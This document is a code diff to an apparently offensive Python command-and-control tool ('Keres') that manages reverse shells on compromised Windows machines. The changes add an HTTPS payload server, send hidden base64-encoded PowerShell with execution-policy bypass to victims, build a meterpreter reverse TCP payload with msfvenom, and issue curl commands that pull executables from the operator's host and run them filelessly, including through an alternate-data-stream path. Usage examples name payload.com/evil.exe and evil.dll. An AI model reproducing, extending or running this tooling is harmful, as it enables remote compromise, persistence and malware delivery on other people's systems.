@@ -17,6 +17,11 @@ import http.server
 import socketserver
 import base64
 import requests
+import os
+import tempfile
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+from ssl import wrap_socket, PROTOCOL_TLSv1_2
+
 # List of ASCII art banners
 banners = [
     '''
@@ -240,7 +245,33 @@ def start_http_server(port=8585):
             raise e
         
 
+def start_https_server():
+    LISTEN_IP = get_my_ip()
+    LISTEN_PORT = 8443
 
+    with tempfile.TemporaryDirectory() as temp_dir:
+        key_file = os.path.join(temp_dir, 'k')
+        cert_file = os.path.join(temp_dir, 'c')
+
+        # Generate a self-signed certificate
+        os.system(f'openssl req -x509 -newkey rsa:3072 -nodes -keyout {key_file} -out {cert_file} -sha256 -days 5 -subj "/CN=localhost"')
+
+        class BasicAuthHandler(SimpleHTTPRequestHandler):
+            def do_GET(self):
+                SimpleHTTPRequestHandler.do_GET(self)
+
+        SERVER = HTTPServer((LISTEN_IP, LISTEN_PORT), BasicAuthHandler)
+        SERVER.socket = wrap_socket(SERVER.socket, server_side=True, certfile=cert_file, keyfile=key_file, ssl_version=PROTOCOL_TLSv1_2)
+
+        print(f'Serving HTTPS on {LISTEN_IP} port {LISTEN_PORT} ...')
+
+        try:
+            SERVER.serve_forever()
+        except KeyboardInterrupt:
+            pass
+         
+        # Clean up
+        os.system(f'shred {key_file} || true')
 
 def persist_shell(conn, addr, shell_id):
     # Read the PowerShell script from the file
@@ -255,10 +286,11 @@ def persist_shell(conn, addr, shell_id):
     encoded_ps_script = base64.b64encode(ps_script.encode('utf-16le')).decode()
 
     # Create the PowerShell command
-    command = f'powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_ps_script}'
+    command = f'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_ps_script}'
     print("\033[91m[*] Executing Keres ..... \033[0m")
-    # Execute the command
-    subprocess.run(command, shell=True)
+    # Execute the command on shell 
+    conn.send(command.encode())
+    print(f"[*] Persisted shell {shell_id} from IP {addr}")
 def upgrade_shell(conn,addr, shell_id):
     # Start HTTP server in a new thread
 
@@ -266,7 +298,7 @@ def upgrade_shell(conn,addr, shell_id):
     subprocess.run(["msfvenom", "-p", "windows/x64/meterpreter_reverse_tcp", f"lhost={get_my_ip()}", "lport=4444", "-f", "exe", "-o", "./meter/https.exe"])    
     print("\033[91mgenerated meterpreter payload")
     
-    command = f"""cmd /c "cd %TEMP% && curl http://{get_my_ip()}:8585/exec.exe -OJ && exec.exe http://{get_my_ip()}:8585/meter/https.exe EXE" """
+    command = f"""cmd /c "cd %TEMP% && IF NOT EXIST curl https://{get_my_ip()}:8585/exec.exe -OJ && exec.exe https://{get_my_ip()}:8585/meter/https.exe EXE" """
     conn.send(command.encode())
     print("Host : "+get_my_ip() + " Port : 4444")
     time.sleep(2)   
@@ -278,10 +310,13 @@ def upgrade_shell(conn,addr, shell_id):
     print("     set lport 4444")
     print("     exploit")
 
-def exec_shell(conn, addr, shell_id, url, type):
+def exec_shell(conn, addr, shell_id, url, type,func=""):
+
+    if func != "":
+        func = "--Method " + func
 
     print("\033[94m[*] Executing PE Filelessly in memory on shell {shell_id} from IP {addr}")
-    command = f"""cmd.exe /c  "curl http://{get_my_ip()}:8585/exec.exe -o %TEMP%\sys.m:_.exe && cd %TEMP% && powershell.exe -windowstyle hidden -c .\sys.m:_.exe {url} {type}" """
+    command = f"""cmd.exe /c  "IF NOT EXIST %TEMP%\sys.m:_.exe curl https://{get_my_ip()}:8585/exec.exe -o %TEMP%\sys.m:_.exe && cd %TEMP% && powershell.exe -windowstyle hidden -c .\sys.m:_.exe {url} {type} {func}" """
     conn.send(command.encode())
     
     time.sleep(2)
@@ -397,6 +432,7 @@ while True:
                     if len(parts) < 4:
                         print("Invalid command. Usage: exec <id> <url> <TYPE>")
                         print("example :exec 2 http://payload.com/evil.exe  EXE")
+                        print("example :exec 2 http://payload.com/evil.dll  DLL --Method DLLRegisterServer")
                         continue
 
                     shell_id = parts[1]
